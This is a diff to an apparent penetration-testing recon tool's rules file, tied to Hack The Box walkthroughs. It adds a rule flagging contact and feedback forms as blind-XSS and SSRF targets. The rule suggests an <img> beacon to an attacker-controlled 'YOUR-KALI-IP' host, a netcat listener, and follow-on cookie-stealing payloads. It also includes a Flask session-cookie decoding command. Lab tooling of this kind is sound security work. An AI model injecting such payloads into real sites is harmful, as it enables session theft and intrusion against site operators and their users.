@@ -131,3 +131,14 @@
     - text: "If the app sets a Flask 'session' cookie it is CLIENT-SIDE signed — decode its structure (read-only) to see which fields the server trusts"
       command: "flask-unsign --decode --cookie '<paste the session cookie>'"
 # source: walkthroughs/htb-spider.md (Werkzeug/Flask/Django app recon)
+
+- match:
+    service: http
+    field: path
+    value: "(?i)(contact|feedback|guest-?book|leave.?a.?message|submit.?message|comment|inquir|suggestion|support|ticket|review)"
+  suggest:
+    - text: "Form endpoint {path} — content an ADMIN or a headless-browser BOT may later read/render. Classic blind/stored-XSS + client-side-SSRF surface. Read the form's fields/method/action first (which inputs get stored and re-displayed)"
+      command: "curl -s http://{target}:{port}{path}"
+    - text: "Out-of-band callback test (run by hand): submit a benign canary that only phones home (an <img src=http://YOUR-KALI-IP/xss-canary> in a stored field) and watch a listener (php -S 0.0.0.0:80 / nc -lvnp 80). A hit whose User-Agent is a real Chrome/HeadlessChrome proves a bot renders your input — then escalate manually from the Exploitation tab (xss-blind-oob-beacon, xss-cookie-steal, xss-ssrf-internal-read)"
+      command: "curl -sI http://{target}:{port}{path}"
+# source: walkthroughs/htb-ropetwo.md (contact form rendered by an admin Chrome bot => blind XSS + client-side SSRF)
